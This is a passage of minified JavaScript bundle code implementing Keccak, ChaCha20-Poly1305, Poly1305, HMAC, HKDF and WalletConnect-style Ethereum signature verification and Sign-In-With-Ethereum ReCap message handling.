            this.posOut >= o && this.keccak();
            const s = Math.min(o - this.posOut, n - i);
            e.set(t.subarray(this.posOut, this.posOut + s), i),
            this.posOut += s,
            i += s
        }
        return e
    }
    xofInto(e) {
        if (!this.enableXOF)
            throw new Error("XOF is not possible for this instance");
        return this.writeInto(e)
    }
    xof(e) {
        return qp(e),
        this.xofInto(new Uint8Array(e))
    }
    digestInto(e) {
        if (EN(e, this),
        this.finished)
            throw new Error("digest() was already called");
        return this.writeInto(e),
        this.destroy(),
        e
    }
    digest() {
        return this.digestInto(new Uint8Array(this.outputLen))
    }
    destroy() {
        this.destroyed = !0,
        this.state.fill(0)
    }
    _cloneInto(e) {
        const {blockLen: t, suffix: o, outputLen: i, rounds: n, enableXOF: s} = this;
        return e || (e = new BN(t,o,i,s,n)),
        e.state32.set(this.state32),
        e.pos = this.pos,
        e.posOut = this.posOut,
        e.finished = this.finished,
        e.rounds = n,
        e.suffix = o,
        e.outputLen = i,
        e.enableXOF = s,
        e.destroyed = this.destroyed,
        e
    }
}
;
const Zee = (r, e, t) => AN( () => new Kee(e,r,t))
  , Yee = Zee(1, 136, 256 / 8)
  , Xee = "https://rpc.walletconnect.org/v1";
function _N(r) {
    const e = `Ethereum Signed Message:
${r.length}`
      , t = new TextEncoder().encode(e + r);
    return "0x" + Buffer.from(Yee(t)).toString("hex")
}
async function Jee(r, e, t, o, i, n) {
    switch (t.t) {
    case "eip191":
        return await Qee(r, e, t.s);
    case "eip1271":
        return await ete(r, e, t.s, o, i, n);
    default:
        throw new Error(`verifySignature failed: Attempted to verify CacaoSignature with unknown type: ${t.t}`)
    }
}
async function Qee(r, e, t) {
    return (await tQ({
        hash: _N(e),
        signature: t
    })).toLowerCase() === r.toLowerCase()
}
async function ete(r, e, t, o, i, n) {
    const s = vm(o);
    if (!s.namespace || !s.reference)
        throw new Error(`isValidEip1271Signature failed: chainId must be in CAIP-2 format, received: ${o}`);
    try {
        const a = "0x1626ba7e"
          , l = "0000000000000000000000000000000000000000000000000000000000000040"
          , f = "0000000000000000000000000000000000000000000000000000000000000041"
          , h = t.substring(2)
          , p = _N(e).substring(2)
          , b = a + p + l + f + h
          , v = await fetch(`${n || Xee}/?chainId=${o}&projectId=${i}`, {
            method: "POST",
            body: JSON.stringify({
                id: tte(),
                jsonrpc: "2.0",
                method: "eth_call",
                params: [{
                    to: r,
                    data: b
                }, "latest"]
            })
        })
          , {result: T} = await v.json();
        return T ? T.slice(0, a.length).toLowerCase() === a.toLowerCase() : !1
    } catch (a) {
        return console.error("isValidEip1271Signature: ", a),
        !1
    }
}
function tte() {
    return Date.now() + Math.floor(Math.random() * 1e3)
}
function rte(r) {
    const e = atob(r)
      , t = new Uint8Array(e.length);
    for (let s = 0; s < e.length; s++)
        t[s] = e.charCodeAt(s);
    const o = t[0];
    if (o === 0)
        throw new Error("No signatures found");
    const i = 1 + o * 64;
    if (t.length < i)
        throw new Error("Transaction data too short for claimed signature count");
    if (t.length < 100)
        throw new Error("Transaction too short");
    const n = Buffer.from(r, "base64").slice(1, 65);
    return oQ.encode(n)
}
var nte = Object.defineProperty
  , ote = Object.defineProperties
  , ite = Object.getOwnPropertyDescriptors
  , FB = Object.getOwnPropertySymbols
  , ste = Object.prototype.hasOwnProperty
  , ate = Object.prototype.propertyIsEnumerable
  , UB = (r, e, t) => e in r ? nte(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , cte = (r, e) => {
    for (var t in e || (e = {}))
        ste.call(e, t) && UB(r, t, e[t]);
    if (FB)
        for (var t of FB(e))
            ate.call(e, t) && UB(r, t, e[t]);
    return r
}
  , lte = (r, e) => ote(r, ite(e));
const ute = "did:pkh:"
  , _3 = r => r == null ? void 0 : r.split(":")
  , fte = r => {
    const e = r && _3(r);
    if (e)
        return r.includes(ute) ? e[3] : e[1]
}
  , LE = r => {
    const e = r && _3(r);
    if (e)
        return e[2] + ":" + e[3]
}
  , o1 = r => {
    const e = r && _3(r);
    if (e)
        return e.pop()
}
;
async function kB(r) {
    const {cacao: e, projectId: t} = r
      , {s: o, p: i} = e
      , n = IN(i, i.iss)
      , s = o1(i.iss);
    return await Jee(s, n, o, LE(i.iss), t)
}
const IN = (r, e) => {
    const t = `${r.domain} wants you to sign in with your Ethereum account:`
      , o = o1(e);
    if (!r.aud && !r.uri)
        throw new Error("Either `aud` or `uri` is required to construct the message");
    let i = r.statement || void 0;
    const n = `URI: ${r.aud || r.uri}`
      , s = `Version: ${r.version}`
      , a = `Chain ID: ${fte(e)}`
      , l = `Nonce: ${r.nonce}`
      , f = `Issued At: ${r.iat}`
      , h = r.exp ? `Expiration Time: ${r.exp}` : void 0
      , p = r.nbf ? `Not Before: ${r.nbf}` : void 0
      , b = r.requestId ? `Request ID: ${r.requestId}` : void 0
      , v = r.resources ? `Resources:${r.resources.map(x => `
- ${x}`).join("")}` : void 0
      , T = Tm(r.resources);
    if (T) {
        const x = Vp(T);
        i = wte(i, x)
    }
    return [t, o, "", i, "", n, s, a, l, f, h, p, b, v].filter(x => x != null).join(`
`)
}
;
function dte(r) {
    return Buffer.from(JSON.stringify(r)).toString("base64")
}
function hte(r) {
    return JSON.parse(Buffer.from(r, "base64").toString("utf-8"))
}
function du(r) {
    if (!r)
        throw new Error("No recap provided, value is undefined");
    if (!r.att)
        throw new Error("No `att` property found");
    const e = Object.keys(r.att);
    if (!(e != null && e.length))
        throw new Error("No resources found in `att` property");
    e.forEach(t => {
        const o = r.att[t];
        if (Array.isArray(o))
            throw new Error(`Resource must be an object: ${t}`);
        if (typeof o != "object")
            throw new Error(`Resource must be an object: ${t}`);
        if (!Object.keys(o).length)
            throw new Error(`Resource object is empty: ${t}`);
        Object.keys(o).forEach(i => {
            const n = o[i];
            if (!Array.isArray(n))
                throw new Error(`Ability limits ${i} must be an array of objects, found: ${n}`);
            if (!n.length)
                throw new Error(`Value of ${i} is empty array, must be an array with objects`);
            n.forEach(s => {
                if (typeof s != "object")
                    throw new Error(`Ability limits (${i}) must be an array of objects, found: ${s}`)
            }
            )
        }
        )
    }
    )
}
function pte(r, e, t, o={}) {
    return t == null || t.sort( (i, n) => i.localeCompare(n)),
    {
        att: {
            [r]: gte(e, t, o)
        }
    }
}
function gte(r, e, t={}) {
    e = e == null ? void 0 : e.sort( (i, n) => i.localeCompare(n));
    const o = e.map(i => ({
        [`${r}/${i}`]: [t]
    }));
    return Object.assign({}, ...o)
}
function ON(r) {
    return du(r),
    `urn:recap:${dte(r).replace(/=/g, "")}`
}
function Vp(r) {
    const e = hte(r.replace("urn:recap:", ""));
    return du(e),
    e
}
function yte(r, e, t) {
    const o = pte(r, e, t);
    return ON(o)
}
function bte(r) {
    return r && r.includes("urn:recap:")
}
function mte(r, e) {
    const t = Vp(r)
      , o = Vp(e)
      , i = xte(t, o);
    return ON(i)
}
function xte(r, e) {
    du(r),
    du(e);
    const t = Object.keys(r.att).concat(Object.keys(e.att)).sort( (i, n) => i.localeCompare(n))
      , o = {
        att: {}
    };
    return t.forEach(i => {
        var n, s;
        Object.keys(((n = r.att) == null ? void 0 : n[i]) || {}).concat(Object.keys(((s = e.att) == null ? void 0 : s[i]) || {})).sort( (a, l) => a.localeCompare(l)).forEach(a => {
            var l, f;
            o.att[i] = lte(cte({}, o.att[i]), {
                [a]: ((l = r.att[i]) == null ? void 0 : l[a]) || ((f = e.att[i]) == null ? void 0 : f[a])
            })
        }
        )
    }
    ),
    o
}
function wte(r="", e) {
    du(e);
    const t = "I further authorize the stated URI to perform the following actions on my behalf: ";
    if (r.includes(t))
        return r;
    const o = [];
    let i = 0;
    Object.keys(e.att).forEach(a => {
        const l = Object.keys(e.att[a]).map(p => ({
            ability: p.split("/")[0],
            action: p.split("/")[1]
        }));
        l.sort( (p, b) => p.action.localeCompare(b.action));
        const f = {};
        l.forEach(p => {
            f[p.ability] || (f[p.ability] = []),
            f[p.ability].push(p.action)
        }
        );
        const h = Object.keys(f).map(p => (i++,
        `(${i}) '${p}': '${f[p].join("', '")}' for '${a}'.`));
        o.push(h.join(", ").replace(".,", "."))
    }
    );
    const n = o.join(" ")
      , s = `${t}${n}`;
    return `${r ? r + " " : ""}${s}`
}
function LB(r) {
    var e;
    const t = Vp(r);
    du(t);
    const o = (e = t.att) == null ? void 0 : e.eip155;
    return o ? Object.keys(o).map(i => i.split("/")[1]) : []
}
function $B(r) {
    const e = Vp(r);
    du(e);
    const t = [];
    return Object.values(e.att).forEach(o => {
        Object.values(o).forEach(i => {
            var n;
            (n = i == null ? void 0 : i[0]) != null && n.chains && t.push(i[0].chains)
        }
        )
    }
    ),
    [...new Set(t.flat())]
}
function Tm(r) {
    if (!r)
        return;
    const e = r == null ? void 0 : r[r.length - 1];
    return bte(e) ? e : void 0
}
function f2(r) {
    if (!Number.isSafeInteger(r) || r < 0)
        throw new Error("positive integer expected, got " + r)
}
function RN(r) {
    return r instanceof Uint8Array || ArrayBuffer.isView(r) && r.constructor.name === "Uint8Array"
}
function si(r, ...e) {
    if (!RN(r))
        throw new Error("Uint8Array expected");
    if (e.length > 0 && !e.includes(r.length))
        throw new Error("Uint8Array expected of length " + e + ", got length=" + r.length)
}
function zB(r, e=!0) {
    if (r.destroyed)
        throw new Error("Hash instance has been destroyed");
    if (e && r.finished)
        throw new Error("Hash#digest() has already been called")
}
function vte(r, e) {
    si(r);
    const t = e.outputLen;
    if (r.length < t)
        throw new Error("digestInto() expects output buffer of length at least " + t)
}
function jB(r) {
    if (typeof r != "boolean")
        throw new Error(`boolean expected, not ${r}`)
}
const zc = r => new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength / 4))
  , Tte = r => new DataView(r.buffer,r.byteOffset,r.byteLength)
  , Ete = new Uint8Array(new Uint32Array([287454020]).buffer)[0] === 68;
if (!Ete)
    throw new Error("Non little-endian hardware is not supported");
function Ate(r) {
    if (typeof r != "string")
        throw new Error("string expected");
    return new Uint8Array(new TextEncoder().encode(r))
}
function $E(r) {
    if (typeof r == "string")
        r = Ate(r);
    else if (RN(r))
        r = zE(r);
    else
        throw new Error("Uint8Array expected, got " + typeof r);
    return r
}
function Pte(r, e) {
    if (e == null || typeof e != "object")
        throw new Error("options must be defined");
    return Object.assign(r, e)
}
function Cte(r, e) {
    if (r.length !== e.length)
        return !1;
    let t = 0;
    for (let o = 0; o < r.length; o++)
        t |= r[o] ^ e[o];
    return t === 0
}
const Ste = (r, e) => {
    function t(o, ...i) {
        if (si(o),
        r.nonceLength !== void 0) {
            const f = i[0];
            if (!f)
                throw new Error("nonce / iv required");
            r.varSizeNonce ? si(f) : si(f, r.nonceLength)
        }
        const n = r.tagLength;
        n && i[1] !== void 0 && si(i[1]);
        const s = e(o, ...i)
          , a = (f, h) => {
            if (h !== void 0) {
                if (f !== 2)
                    throw new Error("cipher output not supported");
                si(h)
            }
        }
        ;
        let l = !1;
        return {
            encrypt(f, h) {
                if (l)
                    throw new Error("cannot encrypt() twice with same key + nonce");
                return l = !0,
                si(f),
                a(s.encrypt.length, h),
                s.encrypt(f, h)
            },
            decrypt(f, h) {
                if (si(f),
                n && f.length < n)
                    throw new Error("invalid ciphertext length: smaller than tagLength=" + n);
                return a(s.decrypt.length, h),
                s.decrypt(f, h)
            }
        }
    }
    return Object.assign(t, r),
    t
}
;
function qB(r, e, t=!0) {
    if (e === void 0)
        return new Uint8Array(r);
    if (e.length !== r)
        throw new Error("invalid output length, expected " + r + ", got: " + e.length);
    if (t && !Bte(e))
        throw new Error("invalid output, must be aligned");
    return e
}
function VB(r, e, t, o) {
    if (typeof r.setBigUint64 == "function")
        return r.setBigUint64(e, t, o);
    const i = BigInt(32)
      , n = BigInt(4294967295)
      , s = Number(t >> i & n)
      , a = Number(t & n);
    r.setUint32(e + 4, s, o),
    r.setUint32(e + 0, a, o)
}
function Bte(r) {
    return r.byteOffset % 4 === 0
}
function zE(r) {
    return Uint8Array.from(r)
}
function Cd(...r) {
    for (let e = 0; e < r.length; e++)
        r[e].fill(0)
}
const WN = r => Uint8Array.from(r.split("").map(e => e.charCodeAt(0)))
  , _te = WN("expand 16-byte k")
  , Ite = WN("expand 32-byte k")
  , Ote = zc(_te)
  , Rte = zc(Ite);
function pr(r, e) {
    return r << e | r >>> 32 - e
}
function jE(r) {
    return r.byteOffset % 4 === 0
}
const fy = 64
  , Wte = 16
  , MN = 2 ** 32 - 1
  , HB = new Uint32Array;
function Mte(r, e, t, o, i, n, s, a) {
    const l = i.length
      , f = new Uint8Array(fy)
      , h = zc(f)
      , p = jE(i) && jE(n)
      , b = p ? zc(i) : HB
      , v = p ? zc(n) : HB;
    for (let T = 0; T < l; s++) {
        if (r(e, t, o, h, s, a),
        s >= MN)
            throw new Error("arx: counter overflow");
        const x = Math.min(fy, l - T);
        if (p && x === fy) {
            const E = T / 4;
            if (T % 4 !== 0)
                throw new Error("arx: invalid block position");
            for (let B = 0, P; B < Wte; B++)
                P = E + B,
                v[P] = b[P] ^ h[B];
            T += fy;
            continue
        }
        for (let E = 0, B; E < x; E++)
            B = T + E,
            n[B] = i[B] ^ f[E];
        T += x
    }
}
function Nte(r, e) {
    const {allowShortKeys: t, extendNonceFn: o, counterLength: i, counterRight: n, rounds: s} = Pte({
        allowShortKeys: !1,
        counterLength: 8,
        counterRight: !1,
        rounds: 20
    }, e);
    if (typeof r != "function")
        throw new Error("core must be a function");
    return f2(i),
    f2(s),
    jB(n),
    jB(t),
    (a, l, f, h, p=0) => {
        si(a),
        si(l),
        si(f);
        const b = f.length;
        if (h === void 0 && (h = new Uint8Array(b)),
        si(h),
        f2(p),
        p < 0 || p >= MN)
            throw new Error("arx: counter overflow");
        if (h.length < b)
            throw new Error(`arx: output (${h.length}) is shorter than data (${b})`);
        const v = [];
        let T = a.length, x, E;
        if (T === 32)
            v.push(x = zE(a)),
            E = Rte;
        else if (T === 16 && t)
            x = new Uint8Array(32),
            x.set(a),
            x.set(a, 16),
            E = Ote,
            v.push(x);
        else
            throw new Error(`arx: invalid 32-byte key, got length=${T}`);
        jE(l) || v.push(l = zE(l));
        const B = zc(x);
        if (o) {
            if (l.length !== 24)
                throw new Error("arx: extended nonce must be 24 bytes");
            o(E, B, zc(l.subarray(0, 16)), B),
            l = l.subarray(16)
        }
        const P = 16 - i;
        if (P !== l.length)
            throw new Error(`arx: nonce must be ${P} or 16 bytes`);
        if (P !== 12) {
            const F = new Uint8Array(12);
            F.set(l, n ? 0 : 12 - l.length),
            l = F,
            v.push(l)
        }
        const O = zc(l);
        return Mte(r, E, B, O, f, h, p, s),
        Cd(...v),
        h
    }
}
const Dn = (r, e) => r[e++] & 255 | (r[e++] & 255) << 8;
class Dte {
    constructor(e) {
        this.blockLen = 16,
        this.outputLen = 16,
        this.buffer = new Uint8Array(16),
        this.r = new Uint16Array(10),
        this.h = new Uint16Array(10),
        this.pad = new Uint16Array(8),
        this.pos = 0,
        this.finished = !1,
        e = $E(e),
        si(e, 32);
        const t = Dn(e, 0)
          , o = Dn(e, 2)
          , i = Dn(e, 4)
          , n = Dn(e, 6)
          , s = Dn(e, 8)
          , a = Dn(e, 10)
          , l = Dn(e, 12)
          , f = Dn(e, 14);
        this.r[0] = t & 8191,
        this.r[1] = (t >>> 13 | o << 3) & 8191,
        this.r[2] = (o >>> 10 | i << 6) & 7939,
        this.r[3] = (i >>> 7 | n << 9) & 8191,
        this.r[4] = (n >>> 4 | s << 12) & 255,
        this.r[5] = s >>> 1 & 8190,
        this.r[6] = (s >>> 14 | a << 2) & 8191,
        this.r[7] = (a >>> 11 | l << 5) & 8065,
        this.r[8] = (l >>> 8 | f << 8) & 8191,
        this.r[9] = f >>> 5 & 127;
        for (let h = 0; h < 8; h++)
            this.pad[h] = Dn(e, 16 + 2 * h)
    }
    process(e, t, o=!1) {
        const i = o ? 0 : 2048
          , {h: n, r: s} = this
          , a = s[0]
          , l = s[1]
          , f = s[2]
          , h = s[3]
          , p = s[4]
          , b = s[5]
          , v = s[6]
          , T = s[7]
          , x = s[8]
          , E = s[9]
          , B = Dn(e, t + 0)
          , P = Dn(e, t + 2)
          , O = Dn(e, t + 4)
          , F = Dn(e, t + 6)
          , D = Dn(e, t + 8)
          , I = Dn(e, t + 10)
          , M = Dn(e, t + 12)
          , C = Dn(e, t + 14);
        let W = n[0] + (B & 8191)
          , k = n[1] + ((B >>> 13 | P << 3) & 8191)
          , H = n[2] + ((P >>> 10 | O << 6) & 8191)
          , X = n[3] + ((O >>> 7 | F << 9) & 8191)
          , Y = n[4] + ((F >>> 4 | D << 12) & 8191)
          , V = n[5] + (D >>> 1 & 8191)
          , R = n[6] + ((D >>> 14 | I << 2) & 8191)
          , _ = n[7] + ((I >>> 11 | M << 5) & 8191)
          , $ = n[8] + ((M >>> 8 | C << 8) & 8191)
          , z = n[9] + (C >>> 5 | i)
          , K = 0
          , j = K + W * a + k * (5 * E) + H * (5 * x) + X * (5 * T) + Y * (5 * v);
        K = j >>> 13,
        j &= 8191,
        j += V * (5 * b) + R * (5 * p) + _ * (5 * h) + $ * (5 * f) + z * (5 * l),
        K += j >>> 13,
        j &= 8191;
        let ee = K + W * l + k * a + H * (5 * E) + X * (5 * x) + Y * (5 * T);
        K = ee >>> 13,
        ee &= 8191,
        ee += V * (5 * v) + R * (5 * b) + _ * (5 * p) + $ * (5 * h) + z * (5 * f),
        K += ee >>> 13,
        ee &= 8191;
        let ie = K + W * f + k * l + H * a + X * (5 * E) + Y * (5 * x);
        K = ie >>> 13,
        ie &= 8191,
        ie += V * (5 * T) + R * (5 * v) + _ * (5 * b) + $ * (5 * p) + z * (5 * h),
        K += ie >>> 13,
        ie &= 8191;
        let ae = K + W * h + k * f + H * l + X * a + Y * (5 * E);
        K = ae >>> 13,
        ae &= 8191,
        ae += V * (5 * x) + R * (5 * T) + _ * (5 * v) + $ * (5 * b) + z * (5 * p),
        K += ae >>> 13,
        ae &= 8191;
        let he = K + W * p + k * h + H * f + X * l + Y * a;
        K = he >>> 13,
        he &= 8191,
        he += V * (5 * E) + R * (5 * x) + _ * (5 * T) + $ * (5 * v) + z * (5 * b),
        K += he >>> 13,
        he &= 8191;
        let me = K + W * b + k * p + H * h + X * f + Y * l;
        K = me >>> 13,
        me &= 8191,
        me += V * a + R * (5 * E) + _ * (5 * x) + $ * (5 * T) + z * (5 * v),
        K += me >>> 13,
        me &= 8191;
        let Pe = K + W * v + k * b + H * p + X * h + Y * f;
        K = Pe >>> 13,
        Pe &= 8191,
        Pe += V * l + R * a + _ * (5 * E) + $ * (5 * x) + z * (5 * T),
        K += Pe >>> 13,
        Pe &= 8191;
        let _e = K + W * T + k * v + H * b + X * p + Y * h;
        K = _e >>> 13,
        _e &= 8191,
        _e += V * f + R * l + _ * a + $ * (5 * E) + z * (5 * x),
        K += _e >>> 13,
        _e &= 8191;
        let Fe = K + W * x + k * T + H * v + X * b + Y * p;
        K = Fe >>> 13,
        Fe &= 8191,
        Fe += V * h + R * f + _ * l + $ * a + z * (5 * E),
        K += Fe >>> 13,
        Fe &= 8191;
        let Je = K + W * E + k * x + H * T + X * v + Y * b;
        K = Je >>> 13,
        Je &= 8191,
        Je += V * p + R * h + _ * f + $ * l + z * a,
        K += Je >>> 13,
        Je &= 8191,
        K = (K << 2) + K | 0,
        K = K + j | 0,
        j = K & 8191,
        K = K >>> 13,
        ee += K,
        n[0] = j,
        n[1] = ee,
        n[2] = ie,
        n[3] = ae,
        n[4] = he,
        n[5] = me,
        n[6] = Pe,
        n[7] = _e,
        n[8] = Fe,
        n[9] = Je
    }
    finalize() {
        const {h: e, pad: t} = this
          , o = new Uint16Array(10);
        let i = e[1] >>> 13;
        e[1] &= 8191;
        for (let a = 2; a < 10; a++)
            e[a] += i,
            i = e[a] >>> 13,
            e[a] &= 8191;
        e[0] += i * 5,
        i = e[0] >>> 13,
        e[0] &= 8191,
        e[1] += i,
        i = e[1] >>> 13,
        e[1] &= 8191,
        e[2] += i,
        o[0] = e[0] + 5,
        i = o[0] >>> 13,
        o[0] &= 8191;
        for (let a = 1; a < 10; a++)
            o[a] = e[a] + i,
            i = o[a] >>> 13,
            o[a] &= 8191;
        o[9] -= 8192;
        let n = (i ^ 1) - 1;
        for (let a = 0; a < 10; a++)
            o[a] &= n;
        n = ~n;
        for (let a = 0; a < 10; a++)
            e[a] = e[a] & n | o[a];
        e[0] = (e[0] | e[1] << 13) & 65535,
        e[1] = (e[1] >>> 3 | e[2] << 10) & 65535,
        e[2] = (e[2] >>> 6 | e[3] << 7) & 65535,
        e[3] = (e[3] >>> 9 | e[4] << 4) & 65535,
        e[4] = (e[4] >>> 12 | e[5] << 1 | e[6] << 14) & 65535,
        e[5] = (e[6] >>> 2 | e[7] << 11) & 65535,
        e[6] = (e[7] >>> 5 | e[8] << 8) & 65535,
        e[7] = (e[8] >>> 8 | e[9] << 5) & 65535;
        let s = e[0] + t[0];
        e[0] = s & 65535;
        for (let a = 1; a < 8; a++)
            s = (e[a] + t[a] | 0) + (s >>> 16) | 0,
            e[a] = s & 65535;
        Cd(o)
    }
    update(e) {
        zB(this);
        const {buffer: t, blockLen: o} = this;
        e = $E(e);
        const i = e.length;
        for (let n = 0; n < i; ) {
            const s = Math.min(o - this.pos, i - n);
            if (s === o) {
                for (; o <= i - n; n += o)
                    this.process(e, n);
                continue
            }
            t.set(e.subarray(n, n + s), this.pos),
            this.pos += s,
            n += s,
            this.pos === o && (this.process(t, 0, !1),
            this.pos = 0)
        }
        return this
    }
    destroy() {
        Cd(this.h, this.r, this.buffer, this.pad)
    }
    digestInto(e) {
        zB(this),
        vte(e, this),
        this.finished = !0;
        const {buffer: t, h: o} = this;
        let {pos: i} = this;
        if (i) {
            for (t[i++] = 1; i < 16; i++)
                t[i] = 0;
            this.process(t, 0, !0)
        }
        this.finalize();
        let n = 0;
        for (let s = 0; s < 8; s++)
            e[n++] = o[s] >>> 0,
            e[n++] = o[s] >>> 8;
        return e
    }
    digest() {
        const {buffer: e, outputLen: t} = this;
        this.digestInto(e);
        const o = e.slice(0, t);
        return this.destroy(),
        o
    }
}
function Fte(r) {
    const e = (o, i) => r(i).update($E(o)).digest()
      , t = r(new Uint8Array(32));
    return e.outputLen = t.outputLen,
    e.blockLen = t.blockLen,
    e.create = o => r(o),
    e
}
const Ute = Fte(r => new Dte(r));
function kte(r, e, t, o, i, n=20) {
    let s = r[0]
      , a = r[1]
      , l = r[2]
      , f = r[3]
      , h = e[0]
      , p = e[1]
      , b = e[2]
      , v = e[3]
      , T = e[4]
      , x = e[5]
      , E = e[6]
      , B = e[7]
      , P = i
      , O = t[0]
      , F = t[1]
      , D = t[2]
      , I = s
      , M = a
      , C = l
      , W = f
      , k = h
      , H = p
      , X = b
      , Y = v
      , V = T
      , R = x
      , _ = E
      , $ = B
      , z = P
      , K = O
      , j = F
      , ee = D;
    for (let ae = 0; ae < n; ae += 2)
        I = I + k | 0,
        z = pr(z ^ I, 16),
        V = V + z | 0,
        k = pr(k ^ V, 12),
        I = I + k | 0,
        z = pr(z ^ I, 8),
        V = V + z | 0,
        k = pr(k ^ V, 7),
        M = M + H | 0,
        K = pr(K ^ M, 16),
        R = R + K | 0,
        H = pr(H ^ R, 12),
        M = M + H | 0,
        K = pr(K ^ M, 8),
        R = R + K | 0,
        H = pr(H ^ R, 7),
        C = C + X | 0,
        j = pr(j ^ C, 16),
        _ = _ + j | 0,
        X = pr(X ^ _, 12),
        C = C + X | 0,
        j = pr(j ^ C, 8),
        _ = _ + j | 0,
        X = pr(X ^ _, 7),
        W = W + Y | 0,
        ee = pr(ee ^ W, 16),
        $ = $ + ee | 0,
        Y = pr(Y ^ $, 12),
        W = W + Y | 0,
        ee = pr(ee ^ W, 8),
        $ = $ + ee | 0,
        Y = pr(Y ^ $, 7),
        I = I + H | 0,
        ee = pr(ee ^ I, 16),
        _ = _ + ee | 0,
        H = pr(H ^ _, 12),
        I = I + H | 0,
        ee = pr(ee ^ I, 8),
        _ = _ + ee | 0,
        H = pr(H ^ _, 7),
        M = M + X | 0,
        z = pr(z ^ M, 16),
        $ = $ + z | 0,
        X = pr(X ^ $, 12),
        M = M + X | 0,
        z = pr(z ^ M, 8),
        $ = $ + z | 0,
        X = pr(X ^ $, 7),
        C = C + Y | 0,
        K = pr(K ^ C, 16),
        V = V + K | 0,
        Y = pr(Y ^ V, 12),
        C = C + Y | 0,
        K = pr(K ^ C, 8),
        V = V + K | 0,
        Y = pr(Y ^ V, 7),
        W = W + k | 0,
        j = pr(j ^ W, 16),
        R = R + j | 0,
        k = pr(k ^ R, 12),
        W = W + k | 0,
        j = pr(j ^ W, 8),
        R = R + j | 0,
        k = pr(k ^ R, 7);
    let ie = 0;
    o[ie++] = s + I | 0,
    o[ie++] = a + M | 0,
    o[ie++] = l + C | 0,
    o[ie++] = f + W | 0,
    o[ie++] = h + k | 0,
    o[ie++] = p + H | 0,
    o[ie++] = b + X | 0,
    o[ie++] = v + Y | 0,
    o[ie++] = T + V | 0,
    o[ie++] = x + R | 0,
    o[ie++] = E + _ | 0,
    o[ie++] = B + $ | 0,
    o[ie++] = P + z | 0,
    o[ie++] = O + K | 0,
    o[ie++] = F + j | 0,
    o[ie++] = D + ee | 0
}
const Lte = Nte(kte, {
    counterRight: !1,
    counterLength: 4,
    allowShortKeys: !1
})
  , $te = new Uint8Array(16)
  , GB = (r, e) => {
    r.update(e);
    const t = e.length % 16;
    t && r.update($te.subarray(t))
}
  , zte = new Uint8Array(32);
function KB(r, e, t, o, i) {
    const n = r(e, t, zte)
      , s = Ute.create(n);
    i && GB(s, i),
    GB(s, o);
    const a = new Uint8Array(16)
      , l = Tte(a);
    VB(l, 0, BigInt(i ? i.length : 0), !0),
    VB(l, 8, BigInt(o.length), !0),
    s.update(a);
    const f = s.digest();
    return Cd(n, a),
    f
}
const jte = r => (e, t, o) => ({
    encrypt(i, n) {
        const s = i.length;
        n = qB(s + 16, n, !1),
        n.set(i);
        const a = n.subarray(0, -16);
        r(e, t, a, a, 1);
        const l = KB(r, e, t, a, o);
        return n.set(l, s),
        Cd(l),
        n
    },
    decrypt(i, n) {
        n = qB(i.length - 16, n, !1);
        const s = i.subarray(0, -16)
          , a = i.subarray(-16)
          , l = KB(r, e, t, s, o);
        if (!Cte(a, l))
            throw new Error("invalid tag");
        return n.set(i.subarray(0, -16)),
        r(e, t, n, n, 1),
        Cd(l),
        n
    }
})
  , NN = Ste({
    blockSize: 64,
    nonceLength: 12,
    tagLength: 16
}, jte(Lte));
let DN = class extends B3 {
    constructor(e, t) {
        super(),
        this.finished = !1,
        this.destroyed = !1,
        S3(e);
        const o = Pd(t);
        if (this.iHash = e.create(),
        typeof this.iHash.update != "function")
            throw new Error("Expected instance of class which extends utils.Hash");
        this.blockLen = this.iHash.blockLen,
        this.outputLen = this.iHash.outputLen;
        const i = this.blockLen
          , n = new Uint8Array(i);
        n.set(o.length > i ? e.create().update(o).digest() : o);
        for (let s = 0; s < n.length; s++)
            n[s] ^= 54;
        this.iHash.update(n),
        this.oHash = e.create();
        for (let s = 0; s < n.length; s++)
            n[s] ^= 106;
        this.oHash.update(n),
        n.fill(0)
    }
    update(e) {
        return Ad(this),
        this.iHash.update(e),
        this
    }
    digestInto(e) {
        Ad(this),
        w0(e, this.outputLen),
        this.finished = !0,
        this.iHash.digestInto(e),
        this.oHash.update(e),
        this.oHash.digestInto(e),
        this.destroy()
    }
    digest() {
        const e = new Uint8Array(this.oHash.outputLen);
        return this.digestInto(e),
        e
    }
    _cloneInto(e) {
        e || (e = Object.create(Object.getPrototypeOf(this), {}));
        const {oHash: t, iHash: o, finished: i, destroyed: n, blockLen: s, outputLen: a} = this;
        return e = e,
        e.finished = i,
        e.destroyed = n,
        e.blockLen = s,
        e.outputLen = a,
        e.oHash = t._cloneInto(e.oHash),
        e.iHash = o._cloneInto(e.iHash),
        e
    }
    destroy() {
        this.destroyed = !0,
        this.oHash.destroy(),
        this.iHash.destroy()
    }
}
;
const W1 = (r, e, t) => new DN(r,e).update(t).digest();
W1.create = (r, e) => new DN(r,e);
function qte(r, e, t) {
    return S3(r),
    t === void 0 && (t = new Uint8Array(r.outputLen)),
    W1(r, Pd(t), Pd(e))
}
const d2 = new Uint8Array([0])
  , ZB = new Uint8Array;
function Vte(r, e, t, o=32) {
    if (S3(r),
    qp(o),
    o > 255 * r.outputLen)
        throw new Error("Length should be <= 255*HashLen");
    const i = Math.ceil(o / r.outputLen);
    t === void 0 && (t = ZB);
    const n = new Uint8Array(i * r.outputLen)
      , s = W1.create(r, e)
      , a = s._cloneInto()
      , l = new Uint8Array(s.outputLen);
    for (let f = 0; f < i; f++)
        d2[0] = f + 1,
        a.update(f === 0 ? ZB : l).update(t).update(d2).digestInto(l),
        n.set(l, r.outputLen * f),
        s._cloneInto(a);
    return s.destroy(),
    a.destroy(),
    l.fill(0),
    d2.fill(0),
    n.slice(0, o)
}
const Hte = (r, e, t, o, i) => Vte(r, qte(r, e, t), o, i);
function Gte(r, e, t, o) {
    if (typeof r.setBigUint64 == "function")
        return r.setBigUint64(e, t, o);
    const i = BigInt(32)
      , n = BigInt(4294967295)
      , s = Number(t >> i & n)
      , a = Number(t & n)
      , l = o ? 4 : 0
      , f = o ? 0 : 4;
    r.setUint32(e + l, s, o),
    r.setUint32(e + f, a, o)
}
function Kte(r, e, t) {
    return r & e ^ ~r & t
}
function Zte(r, e, t) {
    return r & e ^ r & t ^ e & t
}
let Yte = class extends B3 {
    constructor(e, t, o, i) {
        super(),
        this.blockLen = e,
        this.outputLen = t,
        this.padOffset = o,
        this.isLE = i,
        this.finished = !1,
        this.length = 0,
        this.pos = 0,
        this.destroyed = !1,
        this.buffer = new Uint8Array(e),
        this.view = u2(this.buffer)
    }
    update(e) {
        Ad(this);
